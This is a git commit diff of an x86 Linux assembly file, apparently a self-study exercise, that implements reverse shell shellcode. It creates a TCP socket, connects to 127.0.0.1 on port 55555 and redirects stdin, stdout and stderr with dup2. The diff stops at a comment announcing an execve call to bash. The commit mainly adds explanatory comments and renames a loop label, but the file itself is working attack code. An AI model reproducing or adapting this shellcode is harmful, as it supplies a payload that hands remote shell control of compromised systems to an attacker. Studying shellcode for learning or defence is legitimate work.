2d4115b96d1c1e862350c9105a481054ac97568e
Nazim <nazim@kali.kali>
2020-11-14 19:23:46 +0100

    adding comments

--- main.asm
+++ main.asm
@@ -3,16 +3,15 @@ section .text
 
 _start: 
 
-    push 0x66      ;socket call
-    pop	 eax
-    push 0x1       ; int argument call
-    pop	 ebx
+       
+    mov	eax, 0x66    ;socket call
+    mov ebx, 0x1   ; int argument call SYS_SOCKET =1 for socket creation
                    ;socket(AF_INET, SOCK_STREAM, 0)
     xor  edx, edx  ;pass args for the socket connection function by pushing the args into the stack from the to first
-    push edx       ; 0
-    push ebx       ; 1
-    push 0x2       ; 2
-    mov  ecx, esp  ; stack pointer to the arguments it will pop them automatically
+    push edx       ; 0 protocol : IPProtocol 
+    push ebx       ; 1 type: SOCK_STREAM used to declare a TCP socket (not a UDP wheer we broadcast with SOCK_DGRAM)
+    push 0x2       ; 2 socket_family AF_INET for IPv4 IP adresses
+    mov  ecx, esp  ; stack pointer to the arguments (the sockadddr_in struct) it will pop them automatically
 
     int 0x80       ; will return the socket descriptor in eax and will be used as so in the next functions
 
@@ -24,7 +23,7 @@ _start:
     push 0x0101017f  ; ip adress 127.0.0.1
     push word 0x03d9 ; port 55555
     push word 0x2    ; 2 AF_INET syscall
-    mov  ecx, esp    ; stack pointer to the arguments it will pop them automatically
+    mov  ecx, esp    ; stack pointer to the arguments of socket structure it will pop them automatically
     
                     ;now push on the stack the parameters for the CONNECT function
     push 0x10       ; size of the structure
@@ -33,21 +32,21 @@ _start:
     mov  ecx, esp   ; args in top of the stack 
     
     mov al, 0x66    ; for SYSCALL_SOCKET 0x66
-    mov bl, 0x3     ; SYS_CONNECT 0x3
+    mov bl, 0x3     ; SYS_CONNECT to say it's connect 0x3 (where 0x1 = SYS_SOCKET  as used first, 2 for SYS_BIND )
     int 0x80        ; now we call connect()
 
-                    ; I/O Redirection using dup2()
+                    ; I/O Redirection using dup2() : consist of redirecting stdin = 0, stdout = 1 and stderr = 2 
 
     pop ebx		; moving the file descriptor from the stack
 	xor eax, eax	; zeroing out the eax register
 	xor ecx, ecx    ; clearing ecx before using the loop
 	mov cl, 0x2     ; setting the loop counter (2, 1 then 0)
 
-looper:     
+ioloop:     
        mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
        int 0x80        ; syscall
        dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
-       jns looper
+       jns ioloop
 
                     ;; call bash witch execve
     
